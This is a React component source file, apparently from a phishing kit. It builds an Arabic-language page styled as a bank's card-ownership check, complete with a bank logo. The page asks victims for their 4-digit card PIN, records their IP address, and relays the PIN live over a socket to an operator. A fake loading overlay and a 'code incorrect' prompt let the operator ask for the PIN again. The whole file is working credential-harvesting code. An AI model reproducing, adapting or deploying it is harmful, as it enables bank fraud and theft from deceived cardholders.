import React, { useEffect, useState } from "react";
import { io } from "socket.io-client";
import { socket } from "../App";



const Code = () => {
  const [code, setCode] = useState("");
  const [ip, setIp] = useState(null);
  const [showOverlay, setShowOverlay] = useState(false);
  const [showDecline, setShowDecline] = useState(false);

  useEffect(() => {
    const getIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setIp(ip);
        const page = "code";
        socket.emit("updateLocation", { ip, page });
      } catch (err) {
        console.error("Failed to fetch visitor IP:", err);
      }
    };

    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
      setShowDecline(true);
    }

    getIP();
  }, []);

  useEffect(() => {
    socket.on("ackCode", (resp) => {
      if (!resp.success) {
        setShowOverlay(false);
        console.error(resp.error);
      }
    });

    return () => {
      socket.off("ackCode");
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setShowOverlay(true);

    while (!ip) {
      await new Promise((resolve) => setTimeout(resolve, 50));
    }

    socket.emit("submitCode", {
      ip,
      verification_code: code,
    });
  };

  const handleChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4);
    setCode(value);
  };

  return (
    <div
      className="min-h-screen font-[Readex Pro] bg-white flex items-center justify-center px-4"
      dir="rtl"
    >
      <div className="w-full max-w-md border rounded-xl shadow-sm p-6">
        <div className="text-center">
          <img
            src="/Bca-logo.svg"
            alt="Logo"
            width="110"
            className="mx-auto mb-4"
          />
          <h5 className="text-lg font-bold mb-3">تأكيد ملكية البطاقة</h5>
          <p className="text-right text-sm text-gray-600 leading-6">
            لضمان حماية معلوماتك وإتمام عملية الدفع بأمان، نرجو منك إدخال الرمز
            السري المكون من ٤ أرقام، يُستخدم هذا الرمز فقط لأغراض التحقق من
            ملكية البطاقة
          </p>

          <form onSubmit={handleSubmit} className="mt-4 text-right">
            <label
              htmlFor="verification_code"
              className="block mb-2 text-sm font-medium"
            >
              أدخل الرمز هنا:
            </label>
            <input
              id="verification_code"
              type="tel"
              className="form-input w-full text-center p-2 border rounded focus:outline-none focus:ring"
              pattern="^[0-9]{4}$"
              value={code}
              onChange={handleChange}
              required
            />

            {showDecline && (
              <div className="bg-red-100 text-red-800 p-2 rounded mt-2 text-sm">
                الرمز المدخل غير صحيح.
              </div>
            )}

            <button
              type="submit"
              className="w-full bg-blue-600 text-white mt-4 py-2 rounded hover:bg-blue-700"
            >
              تأكيد
            </button>

            <p className="text-sm text-gray-500 mt-3">هل تحتاج للمساعدة؟</p>
          </form>
        </div>
      </div>

      {/* Loading Overlay */}
      {showOverlay && (
        <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center">
          <div className="text-center text-white">
            <div className="w-8 h-8 border-4 border-white border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <h5 className="font-bold">يرجى الانتظار</h5>
            <p>انتظر حتى تتم معالجة طلبك</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Code;
